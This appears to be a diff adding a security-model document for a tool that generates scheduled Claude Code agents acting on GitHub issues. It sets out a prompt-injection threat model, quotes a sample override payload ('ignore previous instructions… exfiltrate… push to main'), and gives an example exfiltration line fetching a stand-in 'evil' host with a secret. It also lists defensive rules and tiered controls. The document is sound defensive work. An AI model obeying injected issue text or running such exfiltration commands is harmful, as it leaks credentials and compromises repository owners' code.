@@ -1,0 +1,151 @@
+# Security model
+
+`claude-routines` generates autonomous Claude Code agents that run on a cron,
+read **open GitHub issues**, and act with `Bash`, `gh` auth, and `git push`.
+That is structurally the same hazard as a GitHub Actions `pull_request_target`
+workflow holding a write-scoped `GITHUB_TOKEN`: **untrusted, attacker-influenced
+input flowing into a privileged executor.**
+
+Treat every issue title, body, label, comment, commit message, and branch name
+as untrusted data — never as instructions to the agent. This document is the
+threat model and the defense-in-depth design. It maps to the
+[GitHub Actions Security Checklist](https://corgea.com/learn/github-actions-security-checklist);
+the parallels are exact even though this repo has no Actions workflows.
+
+## Enforcement tiers
+
+A control is only worth what it can enforce **against a prompt-injected agent**.
+Every control here is one of three tiers:
+
+| Tier | Where it lives | Survives prompt injection? |
+|---|---|---|
+| **1 — Build-time enforced** | `build_bodies.py`: `allowed_tools`, `outcomes.branches`, environment scoping | **Yes** — the agent cannot widen these at runtime |
+| **2 — Target-repo enforced** | Branch protection, required reviews, secret scanning, CODEOWNERS — set by *you* on each target repo | **Yes** — enforced by GitHub, not the agent |
+| **3 — Prompt advisory** | Everything in `<repo_invariants>` / `<untrusted_input>` | **No** — guardrails for a well-behaved agent; an injected agent can ignore them |
+
+The design principle: **push every control as far up the tiers as possible.**
+Tier-3 rules are necessary (they shape normal behavior) but never sufficient.
+
+## Threat model
+
+Primary adversary: anyone who can open or comment on an issue in a target repo.
+For a public repo, that is the entire internet. The injection payload is issue
+text crafted to redirect the agent ("ignore previous instructions… run…
+exfiltrate… push to main… commit this file…").
+
+Primary asset at risk: the target repo's source (supply-chain compromise via a
+malicious PR), the `gh` credentials, and anything readable from the runner.
+
+## Controls (mapped to the checklist)
+
+### 1. Untrusted input is data, not instructions — checklist §3, §4
+
+`gen_routines.py` injects a top-priority `<untrusted_input>` section into both
+templates. It states the data/instruction boundary explicitly, enumerates
+common injection shapes, and asserts that a trusted issue's Acceptance section
+is a contract for *what* to build — never authority to override security rules,
+`<repo_invariants>`, or tool/branch limits. **Tier 3** (necessary, not
+sufficient — the tiers below are the real containment).
+
+### 2. Author-trust gate — checklist §3 (untrusted execution)
+
+Operator decision: **only owner & collaborator issues are in scope.** Before any
+triage or selection, the routine runs
+`gh api --paginate repos/<slug>/collaborators --jq '.[].login'`, builds a
+lowercased `TRUSTED` set, and **excludes every issue whose author is not in it**
+— not triaged, not selected, not read as a contract, body never allowed to
+influence any other action. If the collaborator call fails, the routine
+processes **zero** issues (fail-closed, never fail-open). `author` was added to
+the `gh issue list --json` field set so the gate has the data it needs.
+**Tier 3 behavior, but it collapses the injection surface from "the internet"
+to "accounts with repo write access."** Pair with Tier-2 branch protection so a
+compromised collaborator account still can't merge unreviewed.
+
+Residual risk: a trusted author (or a compromised collaborator account) can
+still write an issue whose Acceptance asks for scope expansion or network
+calls. The subagent brief and `<untrusted_input>` explicitly state Acceptance
+authorizes *what to build*, never tool/scope/network expansion, and instruct
+the agent to flag such issues as suspected injection rather than comply — but
+this is Tier 3. Tier-2 review (control §5 + required reviewers) is the
+backstop.
+
+### 3. Least-privilege tool allowlist — checklist §6, §8
+
+`build_bodies.py` sets `allowed_tools` to
+`["Bash","Read","Write","Edit","Glob","Grep"]`. `WebFetch` and `WebSearch` were
+**removed**: issue triage never needs them and they are the cleanest
+exfiltration / SSRF channel an injected instruction could use
+(`fetch https://evil/?d=<secret>`). **Tier 1 — a prompt-injected issue cannot
+add them back.**
+
+Residual risk: `Bash` is irreducible (gh, git, test commands need it) and is a
+general-purpose exfiltration channel (`curl`, `gh api`, DNS). This is the
+analog of the checklist's "restrict runner network egress" item and is **not**
+mitigated at Tier 1 here. Mitigate at the runner/environment layer (egress
+restrictions, ephemeral runners) and at Tier 2 (small `gh` token scope). Treat
+the routine's credentials as compromisable and scope them accordingly.
+
+### 4. Branch-scope containment — checklist §2, §9
+
+`outcomes.branches` is namespaced to `claude/<prefix>-*` per routine (was
+`claude/<prefix>-routine`, which never matched the `claude/issue-N-*` branches
+the prompts actually create — the old allowlist was inert). The prompts now
+instruct branch names `claude/<prefix>-issue-N-<slug>` so real behavior stays
+inside the allowlist, and the routine structurally cannot push to the base
+branch or another routine's branches. **Tier 1.**
+
+> **ASSUMPTION to verify per environment:** that the platform treats
+> `outcomes.branches` as a prefix/glob allowlist. Confirm against
+> `RemoteTrigger action=list` for your environment. If it requires exact
+> branch names, this still needed to change — the previous value was already
+> broken for the per-issue branches the prompts create.
+
+### 5. Human review gate on autonomous code — checklist §3
+
+The single-issue template **no longer enables auto-merge** and forbids the
+agent from merging its own PR. Autonomous code derived from an issue contract
+always lands behind a human (or required-reviewers branch protection) merge
+gate. Note: the platform's `autofix_on_pr_create` flag (true for single-issue)
+only lets the agent fix *its own* PR's CI — it does not bypass review and is
+retained intentionally. **Tier 3 in the prompt; make it Tier 2 with branch
+protection (below).**
+
+### 6. Secret / spec / deploy rules — checklist §4, §6
+
+`secret_globs`, `spec_files`, `banned_deploys` are **prompt strings only
+(Tier 3)** — an injected agent ignores them. The real mitigations are Tier 2:
+secret-scanning pre-commit hooks and push protection on the target repo, and
+CODEOWNERS on spec files. Do not rely on the prompt text alone.
+
+### 7. Generator code execution — checklist §5
+
+`configs.load()` does `import local_configs`, which executes arbitrary Python at
+generation time. **Accepted**: `local_configs.py` is operator-authored and
+gitignored; treat it like any module you write. Do not run `gen_routines.py`
+against a `local_configs.py` you did not author.
+
+## Required operator setup (Tier 2 — you must do this)
+
+The generated routines are only as safe as the target repos. On **every** repo a
+routine targets:
+
+1. **Branch protection on the base branch**: require PR review, require status
+   checks, disallow direct pushes. This is what actually stops a malicious or
+   injected PR from landing — the prompt's "never push to base" is Tier 3.
+2. **Required reviewers / CODEOWNERS** on `spec_files` and any security-critical
+   path, so the agent cannot land changes there without a human.
+3. **Secret scanning + push protection** enabled (and a secret-scanning
+   pre-commit hook), so `secret_globs` is enforced by GitHub, not by a prompt.
+4. **Smallest possible `gh` token scope** for the routine's credential; rotate
+   it; assume it is exfiltratable via `Bash`.
+5. **Runner egress restrictions** if your environment supports them — the
+   `Bash` residual-risk mitigation.
+6. Verify the `outcomes.branches` allowlist semantics for your environment
+   (see the assumption note in §4).
+
+## Reporting
+
+These routines are operator-deployed automation, not a hosted service. Security
+issues with the generator or templates: open an issue on this repo. Issues with
+a *target* repo's exposure: that is Tier-2 operator configuration — see the
+required setup above.
